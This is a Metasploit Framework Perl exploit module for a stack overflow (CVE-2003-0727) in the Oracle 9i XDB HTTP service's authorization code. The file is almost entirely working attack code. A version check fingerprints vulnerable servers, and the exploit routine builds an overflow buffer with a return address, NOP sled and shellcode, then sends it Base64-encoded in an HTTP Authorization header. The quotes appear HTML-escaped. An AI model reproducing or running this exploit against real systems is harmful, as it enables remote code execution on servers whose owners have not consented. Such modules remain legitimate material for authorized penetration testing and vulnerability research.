Oracle 9.2.0.1 Universal XDB HTTP Pass Overflow Exploit
=======================================================

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::oracle9i_xdb_http;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {

	&#039;Name&#039;  => &#039;Oracle 9i XDB HTTP PASS Overflow (win32)&#039;,
	&#039;Version&#039;  => &#039;$Revision: 1.1 $&#039;,
	&#039;Authors&#039; => [ &#039;y0 [at] w00t-shell.net&#039;, ],
	&#039;Arch&#039;  => [ &#039;x86&#039; ],
	&#039;OS&#039;    => [ &#039;win32&#039;, &#039;winnt&#039;, &#039;win2000&#039;, &#039;winxp&#039;, &#039;win2003&#039;],
	&#039;Priv&#039;  => 0,
	&#039;UserOpts&#039;  =>
	  {
		&#039;RHOST&#039; => [1, &#039;ADDR&#039;, &#039;The target address&#039;],
		&#039;RPORT&#039; => [1, &#039;PORT&#039;, &#039;The target port&#039;, 8080],
		&#039;SSL&#039;   => [0, &#039;BOOL&#039;, &#039;Use SSL&#039;],
	  },
	  
	&#039;AutoOpts&#039; => { &#039;EXITFUNC&#039; => &#039;thread&#039; },
	&#039;Payload&#039; =>
	  {
		&#039;Space&#039;     => 450,
		&#039;BadChars&#039;  => "\x00",
		&#039;Prepend&#039;   => "\x81\xc4\xff\xef\xff\xff\x44",
		&#039;Keys&#039;      => [&#039;+ws2ord&#039;],
	  },

	&#039;Description&#039;  => Pex::Text::Freeform(qq{
		This module exploits a stack overflow in the authorization
		code of the Oracle 9i HTTP XDB service. David Litchfield, 
        has illustrated multiple vulnerabilities in the Oracle
        9i XML Database (XDB), during a seminar on "Variations
        at the Blackhat conference. 
}),

	&#039;Refs&#039;  =>   [
		[&#039;BID&#039;, &#039;8375&#039;],
		[&#039;CVE&#039;, &#039;2003-0727&#039;],
	  ],

	&#039;DefaultTarget&#039; => 0,
	&#039;Targets&#039; => [

		[&#039;Oracle 9.2.0.1 Universal&#039;, 0x60616d46],

	  ],

	&#039;Keys&#039; => [&#039;oracle&#039;],

	&#039;DisclosureDate&#039; => &#039;Aug 18 2003&#039;,
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({&#039;Info&#039; => $info, &#039;Advanced&#039; => $advanced}, @_);
	return($self);
}

sub Check {
	my ($self) = @_;
	my $target_host = $self->GetVar(&#039;RHOST&#039;);
	my $target_port = $self->GetVar(&#039;RPORT&#039;);

	my $s = Msf::Socket::Tcp->new
	  (
		&#039;PeerAddr&#039;  => $target_host,
		&#039;PeerPort&#039;  => $target_port,
		&#039;LocalPort&#039; => $self->GetVar(&#039;CPORT&#039;),
		&#039;SSL&#039;       => $self->GetVar(&#039;SSL&#039;),
	  );
	if ($s->IsError) {
		$self->PrintLine(&#039;[*] Error creating socket: &#039; . $s->GetError);
		return $self->CheckCode(&#039;Connect&#039;);
	}

	$s->Send("GET / HTTP/1.0\r\n\r\n");
	my $res = $s->Recv(-1, 20);
	$s->Close();

	if ($res !~ /9\.2\.0\.1\.0/) {
		$self->PrintLine("[*] This server does not appear to be vulnerable.");
		return $self->CheckCode(&#039;Safe&#039;);
	}

	$self->PrintLine("[*] Vulnerable installation detected :-)");
	return $self->CheckCode(&#039;Detected&#039;);
}

sub Exploit
{
	my $self = shift;
	my $target_host = $self->GetVar(&#039;RHOST&#039;);
	my $target_port = $self->GetVar(&#039;RPORT&#039;);
	my $target_idx  = $self->GetVar(&#039;TARGET&#039;);
	my $offset      = $self->GetVar(&#039;OFFSET&#039;);
	my $shellcode   = $self->GetVar(&#039;EncodedPayload&#039;)->Payload;
	my $target = $self->Targets->[$target_idx];

	if (! $self->InitNops(128)) {
		$self->PrintLine("[*] Failed to initialize the nop module.");
		return;
	}

	my $splat =
	  "meta:". Pex::Text::LowerCaseText(442). "\xeb\x64\x42\x42".
	  pack(&#039;V&#039;, $target->[1]). "wwwwoooottttsssshhhhllll".
	  $self->MakeNops(242). "\xeb\x10". $self->MakeNops(109). $shellcode;

	my $sploit =
	  "GET / HTTP/1.1". "\r\n".
	  "Host: $target_host:$target_port". "\r\n".
	  "User-Agent: Mozilla/5.0 (X11; U; Linux i686;".
	  "en-US; rv:1.7.12) Gecko/20050923". "\r\n".
	  "Accept: text/xml,application/xml,application".
	  "/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,".
	  "image/png,*/*;q=0.5". "\r\n".
	  "Accept-Language: en-us,en;q=0.5". "\r\n".
	  "Accept-Encoding: gzip,deflate". "\r\n".
	  "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7". "\r\n".
	  "Keep-Alive: 300". "\r\n".
	  "Connection: keep-alive". "\r\n".
	  "Authorization: Basic ". Pex::Text::Base64Encode($splat, &#039;&#039;).
	  "\r\n\r\n";

	$self->PrintLine(sprintf("[*] Trying to exploit target %s 0x%.8x", $target->[0], $target->[1]));

	my $s = Msf::Socket::Tcp->new
	  (
		&#039;PeerAddr&#039;  => $target_host,
		&#039;PeerPort&#039;  => $target_port,
		&#039;LocalPort&#039; => $self->GetVar(&#039;CPORT&#039;),
		&#039;SSL&#039;       => $self->GetVar(&#039;SSL&#039;),
	  );
	if ($s->IsError) {
		$self->PrintLine(&#039;[*] Error creating socket: &#039; . $s->GetError);
		return;
	}

	$s->Send($sploit);
	$self->Handler($s);
	$s->Close();
	return;
}

1;



